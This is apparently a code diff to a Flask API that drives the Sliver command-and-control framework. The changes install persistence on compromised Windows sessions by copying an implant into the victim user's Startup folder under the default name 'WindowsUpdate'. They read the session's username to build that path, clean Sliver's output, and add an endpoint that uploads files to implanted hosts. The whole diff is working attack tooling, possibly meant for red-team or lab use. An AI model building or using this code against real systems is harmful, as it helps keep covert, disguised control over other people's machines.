@@ -82,7 +82,7 @@ def run_sliver_command(commands: str, timeout: int = 180) -> str:
                 f.write(f"[CMD] Failed after retries: {commands[:100]}\n{last_error[:500]}\n")
             return last_error
 
-        # 过滤连接动画行（以 spinner 字符开头）和空行，再从末尾截取有效输出
+        # 过滤连接动画行和进度行，合并相邻重复行（\r 覆盖产生的冗余）
         spinner_chars = set('|/-\\')
         lines = output.split('\n')
         cleaned_lines = []
@@ -90,12 +90,13 @@ def run_sliver_command(commands: str, timeout: int = 180) -> str:
             stripped = line.strip()
             if not stripped:
                 continue
-            # 过滤以 spinner 字符开头的行（连接动画）
             if stripped[0] in spinner_chars:
+                continue
+            # 合并相邻重复行（\r 刷新进度时每次覆盖产生一行）
+            if cleaned_lines and cleaned_lines[-1] == line:
                 continue
             cleaned_lines.append(line)
         output = '\n'.join(cleaned_lines)
-        # 返回末尾部分（前面的连接动画行已过滤，末尾是实际命令输出）
         if len(output) > 2000:
             output = output[-2000:]
         return output
@@ -403,7 +404,7 @@ def install_persistence():
     session_id = data.get("session_id", "")
     method = data.get("method", "reg")
     name = data.get("name", "WindowsUpdate")
-    target = data.get("target", "C:\\Windows\\Temp\\implant.exe")
+    target = data.get("target", "C:\\Users\\26234\\vm-windows-test.exe").replace("/", "\\")
 
     if not session_id:
         return jsonify({"error": "缺少 session_id"}), 400
@@ -430,10 +431,21 @@ def install_persistence():
     elif method == "startup":
         # 启动文件夹持久化：先上传文件到目标，再复制到启动文件夹
         # 先检查目标文件是否存在，如果不存在则先上传
-        startup_dir = f"C:\\Users\\{name}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-        # 使用 execute 创建快捷方式或复制文件到启动文件夹
+        # 获取当前会话的用户名
+        sessions_output = run_sliver_command("sessions")
+        username = "Administrator"
+        for line in sessions_output.split('\n'):
+            if session_id in line:
+                parts = line.split()
+                # username 通常是第6个字段
+                try:
+                    username = parts[5]
+                except:
+                    pass
+                break
+        startup_dir = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
         copy_cmd = (
-            f'copy /Y "{target}" "{startup_dir}\\{name}.exe"'
+            f'cmd /c copy /Y "{target}" "{startup_dir}\\{name}.exe"'
         )
         commands = (
             f"use {session_id}\n"
@@ -451,13 +463,14 @@ def install_persistence():
     elif method == "schtask":
         success = "success" in output.lower() or "created" in output.lower() or "成功" in output
     elif method == "startup":
-        success = "copied" in output.lower() or "1 file" in output.lower()
+        success = ("copied" in output.lower() or "1 file" in output.lower()
+                   or "已复制         1" in output or "复制了 1 个" in output)
 
     return jsonify({
         "success": success,
         "method": method,
         "name": name,
-        "output": output[:500],
+        "output": output[-500:] if len(output) > 500 else output,
     })
 
 
@@ -528,6 +541,35 @@ def download_implant():
                 return send_from_directory(implant_dir, f, as_attachment=True)
 
     return jsonify({"error": f"未找到 Implant 文件: {name}"}), 404
+
+
+@app.route("/api/v1/upload", methods=["POST"])
+def upload_file():
+    """上传文件到目标会话"""
+    data = request.get_json() or {}
+    session_id = data.get("session_id", "")
+    local_path = data.get("local_path", "")
+    remote_path = data.get("remote_path", "")
+
+    if not session_id:
+        return jsonify({"error": "缺少 session_id"}), 400
+    if not local_path:
+        return jsonify({"error": "缺少 local_path"}), 400
+    if not remote_path:
+        return jsonify({"error": "缺少 remote_path"}), 400
+
+    if not os.path.isfile(local_path):
+        return jsonify({"error": f"本地文件不存在: {local_path}"}), 400
+
+    commands = f"use {session_id}\nupload \"{local_path}\" \"{remote_path}\""
+    output = run_sliver_command(commands, timeout=300)
+
+    return jsonify({
+        "success": "successfully" in output.lower() or "wrote" in output.lower(),
+        "local_path": local_path,
+        "remote_path": remote_path,
+        "output": output[-500:] if len(output) > 500 else output,
+    })
 
 
 @app.route("/api/v1/implant/delete", methods=["POST"])
